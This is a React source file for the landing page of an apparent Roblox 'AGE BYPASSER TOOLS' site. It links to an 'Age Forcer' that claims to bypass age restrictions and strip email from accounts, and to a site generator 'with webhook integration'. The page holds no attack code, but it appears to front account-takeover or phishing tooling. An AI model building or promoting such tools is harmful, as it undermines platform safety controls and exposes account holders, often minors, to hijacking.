export default function HomePage() {
  return (
    <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-br from-purple-900 to-blue-800 text-white p-4">
      <h1 className="text-4xl font-bold mb-8 text-center">AGE BYPASSER TOOLS</h1>
      
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6 max-w-2xl w-full">
        {/* Age Forcer Card */}
        <a 
          href="/age-forcer"
          className="bg-gradient-to-br from-blue-600 to-purple-700 p-6 rounded-2xl shadow-xl hover:shadow-2xl transition-all duration-300 hover:scale-105 text-center"
        >
          <div className="text-3xl mb-3">⚡</div>
          <h2 className="text-2xl font-bold mb-2">Age Forcer</h2>
          <p className="text-blue-100">Bypass age restrictions and remove email from Roblox accounts</p>
        </a>

        {/* Generator Card */}
        <a 
          href="/generator"
          className="bg-gradient-to-br from-green-600 to-emerald-700 p-6 rounded-2xl shadow-xl hover:shadow-2xl transition-all duration-300 hover:scale-105 text-center"
        >
          <div className="text-3xl mb-3">🌐</div>
          <h2 className="text-2xl font-bold mb-2">Site Generator</h2>
          <p className="text-green-100">Create custom websites with webhook integration</p>
        </a>
      </div>

      <div className="mt-12 text-center text-gray-300">
        <p>Advanced tools for Roblox account management</p>
      </div>
    </div>
  );
            }
